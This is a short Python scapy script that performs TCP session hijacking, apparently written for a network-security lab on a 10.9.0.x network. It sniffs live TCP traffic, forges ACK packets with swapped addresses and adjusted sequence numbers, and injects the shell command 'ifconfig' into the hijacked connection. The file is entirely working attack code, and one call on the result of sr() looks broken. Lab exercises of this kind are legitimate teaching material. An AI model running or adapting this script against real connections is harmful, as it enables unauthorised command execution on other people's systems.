#!/usr/bin/env python3
from scapy.all import *

CMD = "ifconfig"

def spoof_reply(pkt):
    ip = IP(src=pkt.getlayer(IP).dst, dst=pkt.getlayer(IP).src)
    tcp = TCP(sport=pkt.getlayer(TCP).dport, dport=pkt.getlayer(TCP).sport, flags="A", seq = pkt.getlayer(TCP).ack + 30, ack = pkt.getlayer(TCP).seq + 30)
    pkt = ip/tcp/CMD
    ls(pkt)
    ans = sr(pkt, filter="tcp", timeout = 1, verbose=0)
    ans.summary()

cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
IFACE = subprocess.run(cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()
pkt = sniff(iface=IFACE, filter='tcp[tcpflags] & (tcp-syn|tcp-fin|tcp-rst) = 0', prn=spoof_reply)[0]